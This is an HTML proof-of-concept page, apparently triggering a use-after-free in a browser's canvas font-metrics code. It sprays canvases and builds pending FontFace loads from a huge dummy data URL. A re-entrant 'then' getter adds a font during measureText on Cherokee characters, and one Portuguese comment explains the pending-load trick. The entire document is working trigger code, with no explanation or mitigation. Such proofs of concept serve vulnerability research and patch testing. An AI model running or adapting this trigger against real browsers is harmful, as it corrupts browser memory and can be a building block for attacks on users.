<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - FontMetrics UAF (Commit Original)</title>
</head>
<body>
<script>
var dummyId = 0;
var alive = [];

for (var i = 0; i < 500; i++) {
    var d = document.createElement('canvas');
    d.width = 1; 
    d.height = 1;
    d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
    alive.push(d);
}

// URL grande (>1MB) para forçar o comportamento de carregamento pendente do commit
var pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';

var metricsDonor = new FontFace('metricsDonor', pendingFontURL);
var measured = new FontFace('measured', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });

document.fonts.add(metricsDonor);
document.fonts.add(measured);
alive.push(metricsDonor, measured);

var reen = false;
Object.defineProperty(metricsDonor, 'then', {
    configurable: true,
    get: function() {
        if (reen) return undefined;
        reen = true;
        document.fonts.add(new FontFace('Unrelated', 'local("x")'));
        reen = false;
        return undefined;
    }
});

var canvas = document.createElement('canvas');
canvas.width = 64; 
canvas.height = 64;
canvas.style.cssText = 'position:absolute;left:-9999px';
document.body.appendChild(canvas);
alive.push(canvas);

var ctx = canvas.getContext('2d');
ctx.font = '10px metricsDonor, measured';

ctx.measureText('\u13A0\u13A2\u13A4');
</script>
</body>
</html>
